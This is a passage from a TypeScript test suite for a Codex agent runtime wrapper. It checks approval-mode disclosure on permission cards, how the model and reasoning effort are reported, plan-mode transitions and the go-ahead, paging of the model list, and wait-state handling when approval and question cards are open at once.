      { provider: 'codex', sessionId: 'th_1', cwd: '/tmp/x', rotation: 0 },
      { providerHome: '/tmp/x/home', approvalMode: 'auto', workFolders: ['/w/a'] },
    )
    expect(configOf(transport, 'thread/resume')).toEqual({ ...EVERY_THREAD_OVERLAY })
    await handle.close()
  })
})

describe('the approval mode is disclosed on the permission scope (078)', () => {
  it('a card raised in AUTO says the session is unattended', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => ({
      ...okThread('th_1'),
      approvalPolicy: 'never',
      approvalsReviewer: 'user',
      sandbox: { type: 'dangerFullAccess' },
    }))
    const runtime = new CodexRuntime(adopt(transport))
    const handle = await runtime.start({
      cwd: '/tmp/x',
      providerHome: '/tmp/x/home',
      approvalMode: 'auto',
    })
    const events: RuntimeEvent[] = []
    const consumer = collect(handle, events)
    await handle.send('go')
    transport.serverRequest(1, 'item/commandExecution/requestApproval', { command: 'ls' })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    expect(firstOfType(events, 'permission_request').scope.approvalMode).toBe('auto')
    await handle.close()
    await consumer
  })

  it('a card raised in ASK discloses ask — the disclosure is never blank', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    transport.serverRequest(1, 'item/commandExecution/requestApproval', { command: 'ls' })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    expect(firstOfType(events, 'permission_request').scope.approvalMode).toBe('ask')
    await handle.close()
    await consumer
  })
})

describe('the effective model + reasoning come from the PROVIDER (081)', () => {
  it('the handshake response reports the model — not the option we passed', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => ({ ...okThread('th_1'), model: 'gpt-5.1-codex' }))
    const handle = await new CodexRuntime(adopt(transport)).start({
      cwd: '/tmp/x',
      providerHome: '/tmp/x/home',
    })
    expect(handle.agentInfo?.model).toBe('gpt-5.1-codex')
    await handle.close()
  })

  it('the handshake ALSO reports the reasoning effort — a config.toml effort shows immediately (082)', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => ({
      ...okThread('th_1'),
      model: 'gpt-5.1-codex',
      reasoningEffort: 'high',
    }))
    const handle = await new CodexRuntime(adopt(transport)).start({
      cwd: '/tmp/x',
      providerHome: '/tmp/x/home',
    })
    expect(handle.agentInfo?.reasoningEffort, 'available at start, not only later').toBe('high')
    expect(handle.agentInfo?.model).toBe('gpt-5.1-codex')
    await handle.close()
  })

  it('what we ASKED for reaches the wire — turn/start carries the effort (024)', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => okThread('th_1'))
    const started: unknown[] = []
    transport.onRequest('turn/start', (params) => {
      started.push(params)
      return {}
    })
    const handle = await new CodexRuntime(adopt(transport)).start({
      cwd: '/tmp/x',
      providerHome: '/tmp/x/home',
      reasoningEffort: 'high',
    })
    await handle.send('think hard about this')
    expect(started).toHaveLength(1)
    expect((started[0] as { effort?: string }).effort).toBe('high')
    await handle.close()
  })

  it('asking for nothing sends nothing — the server keeps its own default (024)', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => okThread('th_1'))
    const started: unknown[] = []
    transport.onRequest('turn/start', (params) => {
      started.push(params)
      return {}
    })
    const handle = await new CodexRuntime(adopt(transport)).start({
      cwd: '/tmp/x',
      providerHome: '/tmp/x/home',
    })
    await handle.send('anything')
    expect((started[0] as { effort?: string }).effort).toBeUndefined()
    await handle.close()
  })

  it('a REPORTED effort is flagged as reported — Codex confirms, so it is fact (024)', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => ({
      ...okThread('th_1'),
      model: 'gpt-5.1-codex',
      reasoningEffort: 'high',
    }))
    const handle = await new CodexRuntime(adopt(transport)).start({
      cwd: '/tmp/x',
      providerHome: '/tmp/x/home',
    })
    expect(handle.agentInfo?.reasoningEffortReported).toBe(true)
    await handle.close()
  })

  it('a handshake WITHOUT an effort still reports none — absent, never invented', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => ({ ...okThread('th_1'), model: 'gpt-5.1-codex' }))
    const handle = await new CodexRuntime(adopt(transport)).start({
      cwd: '/tmp/x',
      providerHome: '/tmp/x/home',
    })
    expect(handle.agentInfo?.reasoningEffort).toBeUndefined()
    await handle.close()
  })

  it('a later model/rerouted preserves the handshake effort (082 + 081 no-erase)', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => ({
      ...okThread('th_1'),
      model: 'gpt-5.1-codex',
      reasoningEffort: 'high',
    }))
    const runtime = new CodexRuntime(adopt(transport))
    const handle = await runtime.start({ cwd: '/tmp/x', providerHome: '/tmp/x/home' })
    const events: RuntimeEvent[] = []
    const consumer = collect(handle, events)
    transport.notification('model/rerouted', {
      threadId: 'th_1',
      turnId: 'tn_1',
      fromModel: 'gpt-5.1-codex',
      toModel: 'gpt-5.1-codex-mini',
      reason: 'overloaded',
    })
    await vi.waitFor(() => expect(handle.agentInfo?.model).toBe('gpt-5.1-codex-mini'))
    expect(handle.agentInfo?.reasoningEffort, 'a reroute reports no effort').toBe('high')
    await handle.close()
    await consumer
  })

  it('thread/settings/updated supplies the reasoning effort and keeps the model current', async () => {
    const { transport, handle, consumer } = await startCodex()
    transport.notification('thread/settings/updated', {
      threadId: 'th_1',
      threadSettings: {
        approvalPolicy: 'on-request',
        approvalsReviewer: 'user',
        sandboxPolicy: { type: 'workspaceWrite' },
        model: 'gpt-5.1-codex-max',
        effort: 'high',
      },
    })
    await vi.waitFor(() => expect(handle.agentInfo?.reasoningEffort).toBe('high'))
    expect(handle.agentInfo?.model).toBe('gpt-5.1-codex-max')
    await handle.close()
    await consumer
  })

  it('a model/rerouted updates the model — the panel must not show a stale one', async () => {
    const { transport, handle, consumer } = await startCodex()
    transport.notification('thread/settings/updated', {
      threadId: 'th_1',
      threadSettings: {
        approvalPolicy: 'on-request',
        approvalsReviewer: 'user',
        sandboxPolicy: { type: 'workspaceWrite' },
        model: 'gpt-5.1-codex',
        effort: 'medium',
      },
    })
    await vi.waitFor(() => expect(handle.agentInfo?.model).toBe('gpt-5.1-codex'))

    transport.notification('model/rerouted', {
      threadId: 'th_1',
      turnId: 'tn_1',
      fromModel: 'gpt-5.1-codex',
      toModel: 'gpt-5.1-codex-mini',
      reason: 'overloaded',
    })
    await vi.waitFor(() => expect(handle.agentInfo?.model).toBe('gpt-5.1-codex-mini'))
    expect(handle.agentInfo?.reasoningEffort).toBe('medium')

    await handle.close()
    await consumer
  })
})

describe('plan mode reaches the Codex wire as collaborationMode (057)', () => {
  async function turnParams(
    options: Record<string, unknown>,
    handshake: Record<string, unknown> = {},
  ): Promise<{
    params: Record<string, unknown>
    transport: FakeTransport
    handle: SessionHandle
  }> {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => ({ ...okThread('th_1'), ...handshake }))
    const sent: unknown[] = []
    transport.onRequest('turn/start', (params) => {
      sent.push(params)
      return turnStartResponse('tn_1')
    })
    const handle = await new CodexRuntime(adopt(transport)).start({
      cwd: '/tmp/x',
      providerHome: '/tmp/x/home',
      ...options,
    })
    await handle.send('do the thing')
    return { params: sent[0] as Record<string, unknown>, transport, handle }
  }

  it('a planning session sends the exact shape the app-server accepts', async () => {
    const { params, handle } = await turnParams({ planMode: true }, { model: 'gpt-5.1-codex' })
    expect(params['collaborationMode']).toEqual({
      mode: 'plan',
      settings: {
        model: 'gpt-5.1-codex',
        reasoning_effort: null,
        developer_instructions: null,
      },
    })
    await handle.close()
  })

  it('an ordinary session sends NO collaborationMode at all', async () => {
    for (const options of [{}, { planMode: false }]) {
      const { params, handle } = await turnParams(options)
      expect(params).not.toHaveProperty('collaborationMode')
      await handle.close()
    }
  })

  it('the effort the session chose survives being asked to plan', async () => {
    const { params, handle } = await turnParams({ planMode: true, reasoningEffort: 'high' })
    expect(params['effort']).toBe('high')
    expect(params['collaborationMode']).toMatchObject({
      settings: { reasoning_effort: 'high' },
    })
    await handle.close()
  })

  it('…and so does an effort only the SERVER knows about', async () => {
    const { params, handle } = await turnParams({ planMode: true }, { reasoningEffort: 'ultra' })
    expect(params).not.toHaveProperty('effort')
    expect(params['collaborationMode']).toMatchObject({ settings: { reasoning_effort: 'ultra' } })
    await handle.close()
  })

  it('a RESUMED planning session is still planning', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/resume', () => okThread('th_1'))
    const sent: unknown[] = []
    transport.onRequest('turn/start', (params) => {
      sent.push(params)
      return turnStartResponse('tn_1')
    })
    const handle = await new CodexRuntime(adopt(transport)).resume(
      { provider: 'codex', sessionId: 'th_1', cwd: '/tmp/x', rotation: 0 },
      { providerHome: '/tmp/x/home', planMode: true },
    )
    await handle.send('carry on')
    expect((sent[0] as Record<string, unknown>)['collaborationMode']).toMatchObject({
      mode: 'plan',
    })
    await handle.close()
  })

  it('a plan-mode session with no reported model REFUSES the turn rather than dropping the setting', async () => {
    const transport = new FakeTransport()
    const handshake = okThread('th_1')
    delete handshake['model']
    transport.onRequest('thread/start', () => handshake)
    const handle = await new CodexRuntime(adopt(transport)).start({
      cwd: '/tmp/x',
      providerHome: '/tmp/x/home',
      planMode: true,
    })
    await expect(handle.send('plan this')).rejects.toThrow(/plan-mode turn/)
    expect(transport.requests.some((r) => r.method === 'turn/start')).toBe(false)
    expect(handle.status()).not.toBe('working')
    await expect(handle.send('plan this')).rejects.toThrow(/plan-mode turn/)
    await handle.close()
  })

  it('the plan document RESTATES the running checklist instead of emptying it (057 review)', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    await handle.send('go')
    transport.notification('turn/plan/updated', {
      threadId: 'th_1',
      turnId: 'tn_1',
      explanation: null,
      plan: [
        { step: 'read hello.js', status: 'completed' },
        { step: 'write the flag', status: 'inProgress' },
      ],
    })
    await vi.waitFor(() => expect(events.some((e) => e.type === 'plan_update')).toBe(true))
    transport.notification('item/completed', {
      threadId: 'th_1',
      turnId: 'tn_1',
      item: { type: 'plan', id: 'p1', text: '# Plan\n\nDo the thing.' },
    })
    await vi.waitFor(() => expect(events.filter((e) => e.type === 'plan_update')).toHaveLength(2))
    const document = events.filter((e) => e.type === 'plan_update').at(-1)
    expect(document).toMatchObject({
      body: '# Plan\n\nDo the thing.',
      steps: [
        { text: 'read hello.js', status: 'done' },
        { text: 'write the flag', status: 'active' },
      ],
    })
    await handle.close()
    await consumer
  })

  it('an EMPTY checklist notification does not wipe what the document would restate (064)', async () => {
    const { transport, handle, events, consumer } = await startCodex()
    await handle.send('go')
    transport.notification('turn/plan/updated', {
      threadId: 'th_1',
      turnId: 'tn_1',
      explanation: null,
      plan: [{ step: 'read hello.js', status: 'inProgress' }],
    })
    await vi.waitFor(() => expect(events.some((e) => e.type === 'plan_update')).toBe(true))

    transport.notification('turn/plan/updated', {
      threadId: 'th_1',
      turnId: 'tn_1',
      explanation: null,
      plan: [],
    })
    await vi.waitFor(() => expect(events.filter((e) => e.type === 'plan_update')).toHaveLength(2))

    transport.notification('item/completed', {
      threadId: 'th_1',
      turnId: 'tn_1',
      item: { type: 'plan', id: 'p1', text: '# Plan\n\nDo the thing.' },
    })
    await vi.waitFor(() => expect(events.filter((e) => e.type === 'plan_update')).toHaveLength(3))

    expect(events.filter((e) => e.type === 'plan_update').at(-1)).toMatchObject({
      body: '# Plan\n\nDo the thing.',
      steps: [{ text: 'read hello.js', status: 'active' }],
    })
    await handle.close()
    await consumer
  })

  it('an UNATTENDED planning session still runs unattended — no new consent surface (057, per 056)', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => ({
      ...okThread('th_1'),
      approvalPolicy: 'never',
      approvalsReviewer: 'user',
      sandbox: { type: 'dangerFullAccess' },
    }))
    const sent: unknown[] = []
    transport.onRequest('turn/start', (params) => {
      sent.push(params)
      return turnStartResponse('tn_1')
    })
    const handle = await new CodexRuntime(adopt(transport)).start({
      cwd: '/tmp/x',
      providerHome: '/tmp/x/home',
      approvalMode: 'auto',
      planMode: true,
    })
    const events: RuntimeEvent[] = []
    const consumer = collect(handle, events)
    await handle.send('plan and go')
    const params = sent[0] as Record<string, unknown>
    expect(params['approvalPolicy'], 'yolo is not softened by planning').toBe('never')
    expect(params['sandboxPolicy']).toEqual({ type: 'dangerFullAccess' })
    expect(params['collaborationMode']).toMatchObject({ mode: 'plan' })
    transport.notification('item/completed', {
      threadId: 'th_1',
      turnId: 'tn_1',
      item: { type: 'plan', id: 'p1', text: '# Plan\n\nDo the thing.' },
    })
    await vi.waitFor(() => expect(events.some((e) => e.type === 'plan_update')).toBe(true))
    expect(events.filter((e) => e.type === 'user_input_request')).toHaveLength(0)
    expect(events.filter((e) => e.type === 'permission_request')).toHaveLength(0)
    await handle.close()
    await consumer
  })
})

describe('the go-ahead that ends Codex plan mode (060)', () => {
  async function planning(options: Record<string, unknown> = {}) {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => ({ ...okThread('th_1'), model: 'gpt-5.6-sol' }))
    const sent: Record<string, unknown>[] = []
    transport.onRequest('turn/start', (params) => {
      sent.push(params as Record<string, unknown>)
      return turnStartResponse(`tn_${sent.length}`)
    })
    const handle = await new CodexRuntime(adopt(transport)).start({
      cwd: '/tmp/x',
      providerHome: '/tmp/x/home',
      planMode: true,
      ...options,
    })
    const events: RuntimeEvent[] = []
    const consumer = collect(handle, events)
    async function turn(text: string): Promise<void> {
      const n = sent.length + 1
      await handle.send(text)
      transport.notification(
        'turn/completed',
        turnCompletedNotification('th_1', completedTurn(`tn_${n}`)),
      )
      await vi.waitFor(() => expect(handle.status()).toBe('idle'))
    }
    return { transport, handle, sent, events, consumer, turn }
  }

  it('⚠️ leaving without approving reaches the wire as the SAME transition (085)', async () => {
    const { handle, sent, consumer, turn } = await planning()
    await turn('plan it')
    expect(
      (sent[0]?.['collaborationMode'] as { mode: string }).mode,
      'positive: it really was planning',
    ).toBe('plan')

    await handle.setPlanMode(false)
    expect(handle.planNeedsGoAhead, 'the bar goes on the REQUEST, not on the next turn').toBe(false)
    await turn('actually, what does the config file look like?')

    const second = sent[1] as Record<string, unknown>
    expect((second['collaborationMode'] as { mode: string }).mode).toBe('default')
    expect(second['input'] ?? second['text'] ?? JSON.stringify(second)).not.toContain('Go ahead')

    await handle.close()
    await consumer
  })

  it('a planning turn carries the INTENDED effort and model, not the last reported ones (076)', async () => {
    const { handle, sent, consumer, turn } = await planning()
    await turn('plan it')
    expect((sent[0]?.['collaborationMode'] as { settings: { model: string } }).settings.model).toBe(
      'gpt-5.6-sol',
    )

    await handle.setReasoningEffort('high')
    await handle.setModel('gpt-5.6-terra')
    await turn('plan it differently')
    const second = sent[1] as Record<string, unknown>
    const mode = second['collaborationMode'] as {
      settings: { model: string; reasoning_effort: string | null }
    }
    expect(second['effort'], 'the turn asks for it').toBe('high')
    expect(mode.settings.reasoning_effort, 'and the field that OVERRIDES it agrees').toBe('high')
    expect(second['model']).toBe('gpt-5.6-terra')
    expect(mode.settings.model).toBe('gpt-5.6-terra')

    await handle.close()
    await consumer
  })

  it('a session that never planned stays quiet until asked, then asserts a mode (076)', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => ({ ...okThread('th_1'), model: 'gpt-5.6-sol' }))
    const sent: Record<string, unknown>[] = []
    transport.onRequest('turn/start', (params) => {
      sent.push(params as Record<string, unknown>)
      return turnStartResponse(`tn_${sent.length}`)
    })
    const handle = await new CodexRuntime(adopt(transport)).start({
      cwd: '/tmp/x',
      providerHome: '/tmp/x/home',
    })
    const events: RuntimeEvent[] = []
    const consumer = collect(handle, events)
    const runTurn = async (text: string): Promise<void> => {
      const n = sent.length + 1
      await handle.send(text)
      transport.notification(
        'turn/completed',
        turnCompletedNotification('th_1', completedTurn(`tn_${n}`)),
      )
      await vi.waitFor(() => expect(handle.status()).toBe('idle'))
    }

    await runTurn('one')
    expect(sent[0]?.['collaborationMode'], 'the quiet path stays quiet').toBeUndefined()
    expect(handle.settings.planMode).toEqual({ effective: false, requested: false })

    await handle.setPlanMode(true)
    expect(handle.settings.planMode, 'queued like every other setting').toEqual({
      effective: false,
      requested: true,
    })
    await runTurn('now plan')
    expect((sent[1]?.['collaborationMode'] as { mode: string }).mode).toBe('plan')
    expect(handle.planNeedsGoAhead).toBe(true)

    await handle.setPlanMode(false)
    await runTurn('go on')
    expect((sent[2]?.['collaborationMode'] as { mode: string }).mode).toBe('default')

    await handle.close()
    await consumer
  })

  it('sends the model on turn/start, which is how a change reaches a running conversation (076)', async () => {
    const { handle, sent, consumer, turn } = await planning({ planMode: false })
    await turn('one')
    expect(sent[0]?.['model'], 'nobody asked, so nothing is claimed').toBeUndefined()
    expect(sent[0]?.['effort'], 'and the same for the effort').toBeUndefined()

    await handle.setModel('gpt-5.6-terra')
    await handle.setReasoningEffort('ultra')
    await turn('two')
    expect(sent[1]?.['model']).toBe('gpt-5.6-terra')
    expect(sent[1]?.['effort']).toBe('ultra')

    await handle.close()
    await consumer
  })

  it('the go-ahead switches the NEXT turn to {mode:"default"} — the measured ending', async () => {
    const { handle, sent, turn, consumer } = await planning()
    await turn('plan it')
    expect(sent[0]?.['collaborationMode']).toMatchObject({ mode: 'plan' })
    expect(handle.planNeedsGoAhead).toBe(true)

    await handle.setPlanMode(false)
    expect(handle.planNeedsGoAhead).toBe(false)

    await turn('Go ahead with this plan.')
    expect(sent[1]?.['collaborationMode']).toEqual({
      mode: 'default',
      settings: { model: 'gpt-5.6-sol', reasoning_effort: null, developer_instructions: null },
    })
    await handle.close()
    await consumer
  })

  it('and KEEPS asserting it on every turn after — the sticky-mode trap in the other direction', async () => {
    const { handle, sent, turn, consumer } = await planning()
    await handle.setPlanMode(false)
    await turn('one')
    await turn('two')
    await turn('three')
    expect(sent.map((p) => (p['collaborationMode'] as { mode: string }).mode)).toEqual([
      'default',
      'default',
      'default',
    ])
    await handle.close()
    await consumer
  })

  it('a RESUMED session that was released comes back released (acceptance 3, across a restart)', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/resume', () => ({ ...okThread('th_1'), model: 'gpt-5.6-sol' }))
    const sent: Record<string, unknown>[] = []
    transport.onRequest('turn/start', (params) => {
      sent.push(params as Record<string, unknown>)
      return turnStartResponse('tn_1')
    })
    const handle = await new CodexRuntime(adopt(transport)).resume(
      { provider: 'codex', sessionId: 'th_1', cwd: '/tmp/x', rotation: 0 },
      { providerHome: '/tmp/x/home', planMode: true, planModeEnded: true },
    )
    expect(handle.planNeedsGoAhead, 'a released plan is not waiting on anyone').toBe(false)
    await handle.send('carry on')
    expect(sent[0]?.['collaborationMode']).toMatchObject({ mode: 'default' })
    await handle.close()
  })

  it('⚠️ but `planModeEnded` WITHOUT `planMode` sends nothing — the systemHint it would wipe', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/resume', () => ({ ...okThread('th_1'), model: 'gpt-5.6-sol' }))
    const sent: Record<string, unknown>[] = []
    transport.onRequest('turn/start', (params) => {
      sent.push(params as Record<string, unknown>)
      return turnStartResponse('tn_1')
    })
    const handle = await new CodexRuntime(adopt(transport)).resume(
      { provider: 'codex', sessionId: 'th_1', cwd: '/tmp/x', rotation: 0 },
      { providerHome: '/tmp/x/home', planModeEnded: true },
    )
    await handle.send('hello')
    expect(sent[0]).not.toHaveProperty('collaborationMode')
    expect(handle.planNeedsGoAhead).toBe(false)
    await handle.close()
  })

  it('refuses a go-ahead nobody asked for, and refuses a second one', async () => {
    const quiet = new FakeTransport()
    quiet.onRequest('thread/start', () => ({ ...okThread('th_1'), model: 'gpt-5.6-sol' }))
    const ordinary = await new CodexRuntime(adopt(quiet)).start({
      cwd: '/tmp/x',
      providerHome: '/tmp/x/home',
    })
    expect(ordinary.planNeedsGoAhead).toBe(false)
    await expect(ordinary.setPlanMode(false)).rejects.toThrow(/not planning/)
    await ordinary.close()

    const { handle, consumer } = await planning()
    await handle.setPlanMode(false)
    await expect(handle.setPlanMode(false)).rejects.toThrow(/already been given the go-ahead/)
    await handle.close()
    await consumer
  })

  it('refuses on a session that is over, BEFORE the flag moves (060 review)', async () => {
    const { handle, consumer } = await planning()
    await handle.close()
    await expect(handle.setPlanMode(false)).rejects.toThrow(/no longer active/)
    expect(handle.planNeedsGoAhead, 'a refused go-ahead must not have moved anything').toBe(true)
    await consumer
  })

  it('a released session with no reported model refuses the turn rather than dropping the switch', async () => {
    const transport = new FakeTransport()
    const handshake = okThread('th_1')
    delete handshake['model']
    transport.onRequest('thread/start', () => handshake)
    const handle = await new CodexRuntime(adopt(transport)).start({
      cwd: '/tmp/x',
      providerHome: '/tmp/x/home',
      planMode: true,
    })
    await handle.setPlanMode(false)
    await expect(handle.send('go ahead')).rejects.toThrow(/post-plan turn/)
    expect(transport.requests.some((r) => r.method === 'turn/start')).toBe(false)
    expect(handle.status()).not.toBe('working')
    await handle.close()
  })

  it('an UNATTENDED session still runs unattended AFTER the go-ahead (acceptance 4, per 056)', async () => {
    const transport = new FakeTransport()
    transport.onRequest('thread/start', () => ({
      ...okThread('th_1'),
      model: 'gpt-5.6-sol',
      approvalPolicy: 'never',
      approvalsReviewer: 'user',
      sandbox: { type: 'dangerFullAccess' },
    }))
    const sent: Record<string, unknown>[] = []
    transport.onRequest('turn/start', (params) => {
      sent.push(params as Record<string, unknown>)
      return turnStartResponse(`tn_${sent.length}`)
    })
    const handle = await new CodexRuntime(adopt(transport)).start({
      cwd: '/tmp/x',
      providerHome: '/tmp/x/home',
      approvalMode: 'auto',
      planMode: true,
    })
    const events: RuntimeEvent[] = []
    const consumer = collect(handle, events)

    await handle.send('plan and go')
    transport.notification('item/completed', {
      threadId: 'th_1',
      turnId: 'tn_1',
      item: { type: 'plan', id: 'p1', text: '# Plan\n\nDo the thing.' },
    })
    await vi.waitFor(() => expect(events.some((e) => e.type === 'plan_update')).toBe(true))
    transport.notification(
      'turn/completed',
      turnCompletedNotification('th_1', completedTurn('tn_1')),
    )
    await vi.waitFor(() => expect(handle.status()).toBe('idle'))

    await handle.setPlanMode(false)
    await handle.send('Go ahead with this plan.')
    expect(sent[1]?.['approvalPolicy'], 'yolo is not softened by the go-ahead').toBe('never')
    expect(sent[1]?.['sandboxPolicy']).toEqual({ type: 'dangerFullAccess' })
    expect(sent[1]?.['collaborationMode']).toMatchObject({ mode: 'default' })
    expect(events.filter((e) => e.type === 'user_input_request')).toHaveLength(0)
    expect(events.filter((e) => e.type === 'permission_request')).toHaveLength(0)
    await handle.close()
    await consumer
  })
})

describe('the model list, asked of the app-server rather than written down (058)', () => {
  const row = (over: Record<string, unknown>): Record<string, unknown> => ({
    id: 'gpt-5.6-sol',
    model: 'gpt-5.6-sol',
    displayName: 'GPT-5.6-Sol',
    description: 'Latest frontier agentic coding model.',
    hidden: false,
    upgrade: null,
    upgradeInfo: null,
    isDefault: true,
    ...over,
  })

  function listing(pages: { data: unknown[]; nextCursor: string | null }[]): {
    runtime: CodexRuntime
    transport: FakeTransport
  } {
    const transport = new FakeTransport()
    let page = 0
    transport.onRequest('model/list', () => pages[Math.min(page++, pages.length - 1)])
    return { runtime: new CodexRuntime(adopt(transport)), transport }
  }

  it("maps a row, and carries the provider's own upgrade note instead of dropping it", async () => {
    const { runtime, transport } = listing([
      {
        data: [
          row({}),
          row({
            id: 'gpt-5.4',
            model: 'gpt-5.4',
            displayName: 'GPT-5.4',
            description: 'Previous frontier model.',
            isDefault: false,
            upgrade: 'gpt-5.6-terra',
            upgradeInfo: {
              model: 'gpt-5.6-terra',
              upgradeCopy: null,
              modelLink: null,
              migrationMarkdown: 'GPT-5.4 will be deprecated soon\n\nSwitch to GPT-5.6 Terra.\n',
            },
          }),
          row({ id: 'gpt-5.4-mini', displayName: '', isDefault: false, upgrade: 'gpt-5.6-luna' }),
        ],
        nextCursor: null,
      },
    ])

    const models = await runtime.listModels({ providerHome: '/tmp/x/home' })
    expect(models).toEqual([
      {
        id: 'gpt-5.6-sol',
        label: 'GPT-5.6-Sol',
        description: 'Latest frontier agentic coding model.',
        isDefault: true,
      },
      {
        id: 'gpt-5.4',
        label: 'GPT-5.4',
        description: 'Previous frontier model.',
        note: 'GPT-5.4 will be deprecated soon\n\nSwitch to GPT-5.6 Terra.',
      },
      {
        id: 'gpt-5.4-mini',
        label: 'gpt-5.4-mini',
        description: 'Latest frontier agentic coding model.',
        note: 'Superseded by gpt-5.6-luna.',
        resolvesTo: 'gpt-5.6-sol',
      },
    ])
    expect(transport.requests.map((r) => r.method)).toEqual(['initialize', 'model/list'])
    expect(transport.closeCount, 'a probe may never leak an app-server').toBe(1)
  })

  it('never asks for HIDDEN rows, and drops one anyway if the server sends it', async () => {
    const { runtime, transport } = listing([
      { data: [row({}), row({ id: 'codex-auto-review', hidden: true })], nextCursor: null },
    ])
    const models = await runtime.listModels({ providerHome: '/tmp/x/home' })

    expect(models.map((m) => m.id)).toEqual(['gpt-5.6-sol'])
    const params = transport.requests.find((r) => r.method === 'model/list')?.params
    expect(params).not.toHaveProperty('includeHidden')
  })

  it('follows the cursor, because taking page one would ship a truncated catalogue', async () => {
    const { runtime, transport } = listing([
      { data: [row({ id: 'a' })], nextCursor: 'c1' },
      { data: [row({ id: 'b' })], nextCursor: 'c2' },
      { data: [row({ id: 'c' })], nextCursor: null },
    ])
    const models = await runtime.listModels({ providerHome: '/tmp/x/home' })

    expect(models.map((m) => m.id)).toEqual(['a', 'b', 'c'])
    expect(
      transport.requests.filter((r) => r.method === 'model/list').map((r) => r.params),
    ).toEqual([{}, { cursor: 'c1' }, { cursor: 'c2' }])
  })

  it('stops on a cursor that never ends, rather than looping forever', async () => {
    const { runtime, transport } = listing([{ data: [row({})], nextCursor: 'always' }])
    const models = await runtime.listModels({ providerHome: '/tmp/x/home' })

    const calls = transport.requests.filter((r) => r.method === 'model/list').length
    expect(calls).toBe(20)
    expect(models).toHaveLength(20)
    expect(transport.closeCount).toBe(1)
  })

  it('gives up on an app-server that is alive but silent, and still reaps it', async () => {
    const transport = new FakeTransport()
    transport.onRequest('model/list', () => new Promise(() => {}))
    const runtime = new CodexRuntime(adopt(transport))

    vi.useFakeTimers()
    try {
      const probing = runtime.listModels({ providerHome: '/tmp/x/home' })
      const settled = expect(probing).rejects.toThrow(/did not answer/)
      await vi.advanceTimersByTimeAsync(20_000)
      await settled
    } finally {
      vi.useRealTimers()
    }
    expect(transport.closeCount, 'the stalled app-server must still be reaped').toBe(1)
  })

  it('closes the app-server when the list FAILS, not only when it succeeds', async () => {
    const transport = new FakeTransport()
    transport.failRequest('model/list')
    const runtime = new CodexRuntime(adopt(transport))
    await expect(runtime.listModels({ providerHome: '/tmp/x/home' })).rejects.toThrow(/model\/list/)
    expect(transport.closeCount, 'a rejected probe still tears its child down').toBe(1)
  })

  it("reports NO wholesale grants, because Codex's live inside the app-server (058)", async () => {
    const { handle, consumer } = await startCodex()
    expect(handle.blanketGrants).toEqual([])
    await handle.close()
    await consumer
  })
})

describe('CodexRuntime — the combined wait lease (063)', () => {
  const statuses = (events: RuntimeEvent[], from: number): string[] =>
    events
      .slice(from)
      .filter((e) => e.type === 'status')
      .map((e) => e.state)

  const flush = (): Promise<void> => new Promise((r) => setTimeout(r, 20))

  const question = (turnId = 'tn_1') => ({
    threadId: 'th_1',
    turnId,
    itemId: 'it',
    questions: [{ id: 'q', question: 'pick', options: ['a', 'b'] }],
  })

  it('an approval and a question: answering the approval leaves the session waiting', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    const before = events.length

    transport.serverRequest(101, 'item/commandExecution/requestApproval', {
      command: 'rm x',
      cwd: '/tmp/x',
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    transport.serverRequest(102, 'item/tool/requestUserInput', question())
    await vi.waitFor(has(events, (e) => e.type === 'user_input_request'))

    expect(statuses(events, before)).toEqual(['waiting_permission'])

    await handle.respondPermission('number:101', { outcome: 'allow' })
    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === 101)).toBe(true))
    await flush()
    expect(statuses(events, before), 'no `working` while a card is still open').toEqual([
      'waiting_permission',
    ])

    await handle.respondUserInput('number:102', { kind: 'answer', answers: { q: 'a' } })
    await vi.waitFor(() =>
      expect(statuses(events, before)).toEqual(['waiting_permission', 'working']),
    )

    await handle.close()
    await consumer
  })

  it('…and in the other order — answering the question first also leaves it waiting', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    const before = events.length

    transport.serverRequest(103, 'item/tool/requestUserInput', question())
    await vi.waitFor(has(events, (e) => e.type === 'user_input_request'))
    transport.serverRequest(104, 'item/commandExecution/requestApproval', {
      command: 'echo two',
      cwd: '/tmp/x',
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    expect(statuses(events, before)).toEqual(['waiting_permission'])

    await handle.respondUserInput('number:103', { kind: 'answer', answers: { q: 'b' } })
    await vi.waitFor(() => expect(transport.responses.some((r) => r.id === 103)).toBe(true))
    await flush()
    expect(statuses(events, before)).toEqual(['waiting_permission'])

    await handle.respondPermission('number:104', { outcome: 'deny' })
    await vi.waitFor(() =>
      expect(statuses(events, before)).toEqual(['waiting_permission', 'working']),
    )

    await handle.close()
    await consumer
  })

  it('one card behaves exactly as it always did — waiting, then working', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    const before = events.length

    transport.serverRequest(105, 'item/commandExecution/requestApproval', {
      command: 'echo solo',
      cwd: '/tmp/x',
    })
    await vi.waitFor(has(events, (e) => e.type === 'permission_request'))
    expect(statuses(events, before)).toEqual(['waiting_permission'])

    await handle.respondPermission('number:105', { outcome: 'allow' })
    await vi.waitFor(() =>
      expect(statuses(events, before)).toEqual(['waiting_permission', 'working']),
    )

    await handle.close()
    await consumer
  })

  it('closing under two open cards never claims the session went back to work', async () => {
    const { transport, handle, events, consumer } = await startCodexInTurn()
    const before = events.length

    transport.serverRequest(106, 'item/commandExecution/requestApproval', {
